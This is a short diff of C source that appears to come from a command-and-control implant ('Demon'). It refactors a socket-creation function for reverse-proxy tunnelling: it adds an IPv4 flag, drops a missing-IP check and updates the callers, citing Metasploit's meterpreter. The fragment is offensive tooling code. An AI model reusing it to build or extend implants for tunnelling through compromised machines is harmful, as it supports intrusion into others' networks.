@@ -56,19 +56,13 @@ BOOL InitWSA( VOID )
 }
 
 /* Inspired from https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/stdapi/server/net/socket/tcp_server.c#L277 */
-PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, DWORD IPv4, PBYTE IPv6, DWORD LclPort, DWORD FwdAddr, DWORD FwdPort )
+PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, BOOL UseIpv4, DWORD IPv4, PBYTE IPv6, DWORD LclPort, DWORD FwdAddr, DWORD FwdPort )
 {
     PSOCKET_DATA    Socket    = NULL;
     SOCKADDR_IN     SockAddr  = { 0 };
     SOCKADDR_IN6_LH SockAddr6 = { 0 };
     u_long          IoBlock   = 1;
     UINT32          ErrorCode = 0;
-
-    if ( ! IPv4 && ! IPv6 )
-    {
-        PUTS( "No valid IP was provided" )
-        return NULL;
-    }
 
     PRINTF( "SocketNew => WinSock:[%x] Type:[%d] IPv4:[%lx] IPv6:[%lx] LclPort:[%ld] FwdAddr:[%lx] FwdPort:[%ld]\n", WinSock, Type, IPv4, IPv6, LclPort, FwdAddr, FwdPort )
 
@@ -81,7 +75,7 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, DWORD IPv4, PBYTE IPv6, DWOR
 
         PUTS( "Create Socket..." )
 
-        if ( IPv4 )
+        if ( UseIpv4 )
         {
             WinSock = Instance.Win32.WSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, NULL );
             if ( WinSock == INVALID_SOCKET )
@@ -128,7 +122,7 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, DWORD IPv4, PBYTE IPv6, DWOR
 
         if ( Type == SOCKET_TYPE_REVERSE_PROXY )
         {
-            if ( IPv4 )
+            if ( UseIpv4 )
             {
                 /* connect to host:port */
                 if ( Instance.Win32.connect( WinSock, ( struct sockaddr * ) &SockAddr, sizeof( SOCKADDR_IN ) ) == SOCKET_ERROR )
@@ -245,7 +239,7 @@ VOID SocketClients()
                 {
                     /* Add the client to the socket linked list so we can read from it later on
                      * TODO: maybe ad a parent to know from what socket it came from so we can free those clients after we killed/removed the parent */
-                    Client = SocketNew( WinSock, SOCKET_TYPE_CLIENT, Socket->IPv4, NULL, Socket->LclPort, Socket->FwdAddr, Socket->FwdPort );
+                    Client = SocketNew( WinSock, SOCKET_TYPE_CLIENT, TRUE, Socket->IPv4, NULL, Socket->LclPort, Socket->FwdAddr, Socket->FwdPort );
 
                     /* create socket response package */
                     Package = PackageCreate( DEMON_COMMAND_SOCKET );
